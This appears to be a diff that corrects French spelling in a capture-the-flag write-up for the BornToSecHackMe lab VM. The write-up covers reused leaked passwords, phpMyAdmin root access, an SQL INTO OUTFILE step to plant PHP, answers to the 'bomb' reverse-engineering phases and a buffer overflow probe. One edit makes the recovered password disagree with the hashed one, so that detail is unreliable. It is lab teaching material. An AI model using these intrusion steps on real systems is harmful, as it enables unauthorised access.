@@ -27,22 +27,22 @@ Nmap done: 1 IP address (1 host up) scanned in 2.53 seconds
 
 ## Exploitation
 
-On va commencer par les ports 80 et 443, qui sont utilisé pour les services Web.
+On va commencer par les ports 80 et 443, qui sont utilisés pour les services Web.
 
 En explorant /forum/ on y trouve des infos intéressantes a cette adresse:
 https://192.168.56.101/forum/index.php?id=6
 
-On peux voir quelque chose d'interessant ici :
+On peut voir quelque chose d'interessant ici :
 
 ![failled password](./screen/failedpassword.png)
 
 On va se connnecter sur le forum en tant que **lmezard** (Auteur du post) avec le mot de passe: `!q\]Ej?*5K5cy*AJ`
 
-L'authentification a reussi.
+L'authentification a reussie.
 
 ### Email
 
-En étant connecter, pas grand chose de nouveau hormis le faite d'apprendre que l'adresse mail de lmezard est laurie@borntosec.net
+En étant connecte, pas grand chose de nouveau hormis le fait d'apprendre que l'adresse mail de lmezard est laurie@borntosec.net
 
 En essayant cette email dans /webmail/ avec le meme mot de passe, on arrive a se connecter.
 Sur la boite mail, on a un mail DB ACCESS qui nous fournit un user root ainsi qu'un mot de passe:
@@ -55,11 +55,11 @@ You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
 Best regards.
 ```
 
-On va dans /phpmyadmin/ et on se connecte avec les identifants données. Et hop, on est sur la bdd en root !
+On va dans /phpmyadmin/ et on se connecte avec les identifants donnés. Et hop, on est sur la bdd en root !
 
 ### phpmyadmin
 
-Maintenant, il faut arrivé a avoir la main sur le serveur, pour cela on va injecter un fichier php qui nous permettra d'éxécuté des commandes.
+Maintenant, il faut arriver a avoir la main sur le serveur, pour cela on va injecter un fichier php qui nous permettra d'éxécuter des commandes.
 
 La difficulté va etre de trouver ou ecrire sur le serveur. En effet, nous n'avons pas les droits pour ecrire dans /var/www/.
 
@@ -70,8 +70,8 @@ SELECT "<?php phpinfo(); ?>" INTO OUTFILE "/var/www/testing.php";
 
 ![sql error](./screen/sql_error.png)
 
-Après une recherche sur internet, on peux trouver le code source du forum et ainsi voir l'arboressence (https://github.com/ilosuna/mylittleforum).
-Nous allons essayer d'ecrire dans un de ses dossier:
+Après une recherche sur internet, on peut trouver le code source du forum et ainsi voir l'arboressence (https://github.com/ilosuna/mylittleforum).
+Nous allons essayer d'ecrire dans un de ces dossiers:
 
 ![sql success](./screen/sql_success.png)
 
@@ -120,11 +120,11 @@ $ python /tmp/asdf.py
 $ su - lmezard
 ```
 
-On rentre le mot de passe et on est connecter en tant que lmezard
+On rentre le mot de passe et on est connecte en tant que lmezard
 
 ### Reconstruction de fichier
 
-On peux voir 2 fichiers (fun et README):
+On peut voir 2 fichiers (fun et README):
 
 ```
 lmezard@BornToSecHackMe:~$ ls -la
@@ -143,7 +143,7 @@ file fun
 fun: POSIX tar archive (GNU)
 ```
 
-Pour téléchargé l'archive: 
+Pour télécharger l'archive:
 ```
 lmezard@BornToSecHackMe:~$ cp fun /var/www/forum/templates_c/fun
 cp fun /var/www/forum/templates_c/fun
@@ -168,7 +168,7 @@ On execute notre programme avec une commande sed:
 $ python scripts/archive_decoder.py 
 ```
 Ensuite il suffit de regarder chaque getme dans l'ordre pour pouvoir reconstruire le mot de passe, ce qui nous donne:
-Iheartpwnage
+`heartpwnage`
 
 On hash ce mot de passe en sha256:
 ```
@@ -176,11 +176,11 @@ $ echo -n "Iheartpwnage" | shasum -a 256
 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
 $ ssh laurie@192.168.56.104
 ```
-on entre le mot de passe et on est connecter :)
+on entre le mot de passe et on est connecte :)
 
 ### Reverse
 
-Lorsqu'on se connecte a l'utilisateur laurie, on peux voir 2 fichiers:
+Lorsqu'on se connecte a l'utilisateur laurie, on peut voir 2 fichiers:
 
 ```
 laurie@BornToSecHackMe:~$ ls
@@ -201,7 +201,7 @@ NO SPACE IN THE PASSWORD (password is case sensitive).
 
 ```
 
-Le README nous donne des indices sur les éléments a trouvé, maintenant il faut reverse le binaire bomb.
+Le README nous donne des indices sur les éléments a trouvermaintenant il faut reverse le binaire bomb.
 Pour download bomb:
 ```
 laurie@BornToSecHackMe:~$ cp bomb /var/www/forum/templates_c/
@@ -289,9 +289,9 @@ Le programme attend 6 nombres. Le calcule des nombres est dans une boucle et cet
 0x08048b79      0faf449efc     imul eax, dword [esi + ebx*4 - 4]
 0x08048b7e      39049e         cmp dword [esi + ebx*4], eax
 ```
-Pour s'en convaincre, on peux lancer le programme avec gdb et regarder la valeur de eax a chaque tour.
+Pour s'en convaincre, on peut lancer le programme avec gdb et regarder la valeur de eax a chaque tour.
 Ce qui nous donne : 1 2 6 24 120 720
-De plus, sa match avec notre indice.
+De plus, ca match avec notre indice.
 
 - **Phase 3**:
 Le programme attend 2 nombres et un caractère dans un certain ordre:
@@ -321,7 +321,7 @@ Le premier nombre correspond au switch, le second paramètre est un caractère e
 ```
 L'indice nous indique que c'est le b, il nous reste donc 2 possibilités:
 1 b 214 ou 2 b 755.
-En lancant le binaire, les 2 solutions seront juste mais pour le mot de passe final, 1 seule solution fonctionne:
+En lancant le binaire, les 2 solutions seront justes mais pour le mot de passe final, 1 seule solution fonctionne:
 le resultat de la phase 3 est donc : 1 b 214
 
 - **Phase 4**:
@@ -331,7 +331,7 @@ La phase 4 attend un nombre, et nous n'avons aucun indice:
 ```
 0x08048cf0      6808980408     push 0x8049808              ; "%d" ; const char *format
 ```
-On peux voir que le code fait appel a une fonction (func4) et attend une valeur de retour a 55:
+On peut voir que le code fait appel a une fonction (func4) et attend une valeur de retour a 55:
 ```
 [...]
 |           0x08048d15      e886ffffff     call sym.func4
@@ -379,7 +379,7 @@ On peux voir que le code fait appel a une fonction (func4) et attend une valeur 
 │           0x08048cdc      5d             pop ebp
 └           0x08048cdd      c3             ret
 ```
-On peux convertir la func4 en un code un peu plus compréhensible avec Ghidra : 
+On peut convertir la func4 en un code un peu plus compréhensible avec Ghidra : 
 ```
 int func4(int param_1)
 
@@ -402,15 +402,15 @@ Personnellement j'y suis allé un peu a "taton", avec un peu de persévérence o
 
 - **Phase 5**:
 
-Notre indice nous indique que la phrase a rentré commence par o
-On peux voir que le programme attend une longueur de 6:
+Notre indice nous indique que la phrase a rentrer commence par 'o'
+On peut voir que le programme attend une longueur de 6:
 ```
 |           0x08048d3b      e8d8020000     call sym.string_length
 │           0x08048d40      83c410         add esp, 0x10
 │           0x08048d43      83f806         cmp eax, 6                  ; 6
 
 ```
-Ensuite une opération est effectuer sur la chaine passé en paramètre:
+Ensuite une opération est effectuee sur la chaine passée en paramètre:
 ```
 |           0x08048d4d      31d2           xor edx, edx
 │           0x08048d4f      8d4df8         lea ecx, dword [var_8h]
@@ -440,7 +440,7 @@ Ce qui correspond a :
   local_6 = 0;
   iVar1 = strings_not_equal(local_c,"giants");
 ```
-Il suffit de reproduire ce comportement pour toutes les lettres du mot giants :)
+Il suffit de reproduire ce comportement pour toutes les lettres du mot `giants` :)
 
 ```
 >>> tableau = "isrveawhobpnutfg\xb0\x01"
@@ -461,12 +461,12 @@ m
 a q 
 
 ```
-Nous avons plusieurs réponse possible, la seul qui fonctionnera pour le mot de passe de thor est : opekmq
+Nous avons plusieurs réponses possibles, la seule qui fonctionnera pour le mot de passe de thor est : `opekmq`
 
 - **Phase 6**:
 
 Nous avons en indice : 4
-Voici la fonction désassemblé sous ghidra:
+Voici la fonction désassemblée sous ghidra:
 ```
 void phase_6(undefined4 param_1)
 
@@ -563,12 +563,12 @@ $ cat exploit.txt |tr -d ' '| tr -d '\n' && echo ""
 Publicspeakingisveryeasy.126241207201b2149opekmq426315
 ```
 
-Et la .... c'est le drame. Sa ne marche pas :(
+Et la .... c'est le drame. Ca ne fonctionne pas :(
 
 Le forum nous donne un indice:
 ![img mouettes](./screen/mouettes.png)
 
-Certaines lettres doivent etre inversé... Python est la pour nous:
+Certaines lettres doivent etre inversées. Python est la pour nous:
 ```
 >>> from pwn import *
 >>> import sys
@@ -616,30 +616,30 @@ Publicspeakingisveryeasy.126241207201b2149opekmq426135
 
 ### Turtle
 
-Une fois connecter sur l'user thor, on peux voir un ReadME et un fichier turtle.
+Une fois connectes sur l'user thor, on peut voir un ReadME et un fichier turtle.
 Le ReadMe nous donne le nom du prochain utilisateur, le turtle des déplacements.
-Après une recherche sur internet, on peux trouver des ressources intéressantes:
+Après une recherche sur internet, on peut trouver des ressources intéressantes:
 https://docs.python.org/fr/3/library/turtle.html
 
 
-Pour solutioné le problème, nous allons utilisé un script python:
+Pour resoudre le probleme nous allons utiliser un script python:
 ```
 $ pip install turtle --user
 $ sudo apt-get install python-tk
 $ python scripts/decode_turtle.py
 ```
-Nous pouvons décodé le motr "SLASH".
+Nous pouvons décoder le mot "SLASH".
 Le ReadMe nous parle de digest, nous allons faire un hash md5
 
 ```
 $ echo -n "SLASH" |md5sum
 646da671ca01bb5d84dbb5fb2238dc8e  -
 ```
-Nous sommes connecté a Zaz.
+Nous sommes connectés a Zaz !
 
 ### Buffer overflow
 
-Une fois connecté a Zaz, on trouve un binaire "exploit_me". On va tester la présence possible d'un buffer overflow
+Une fois connectés a Zaz, on trouve un binaire "exploit_me". On va tester la présence possible d'un buffer overflow
 
 ```
 zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print "A" * 200')
@@ -649,7 +649,7 @@ Segmentation fault (core dumped)
 ```
 Le code est sujet a un BOF ?.
 
-En désassemblant ce binaire, on peux trouvé un code assez simpliste:
+En désassemblant ce binaire, on peut trouver un code assez simpliste:
 ```
 uint main(int param_1,int param_2)
 
@@ -663,7 +663,7 @@ uint main(int param_1,int param_2)
   return (uint)(param_1 < 2);
 }
 ```
-Effectivement, le BOF se confirme. strcpy est une fonction dangeureuse et rien ne vérifie la longueur de la chaine a copié.
+Effectivement, le BOF se confirme. strcpy est une fonction dangeureuse et rien ne vérifie la longueur de la chaine a copier.
 On va donc pouvoir écrire sur la stack.
 
 ```
@@ -692,7 +692,7 @@ gdb-peda$ r < <(python -c 'print "A" * 140 + "BBBB"')
 Stopped reason: SIGSEGV
 0x42424242 in ?? ()
 ```
-On a bien notre adresse de retour qui a été écrasé.
+On a bien notre adresse de retour qui a été écrasée.
 Maintenant, on va chercher l'address qui pointe sur notre buffer
 ```
 (gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
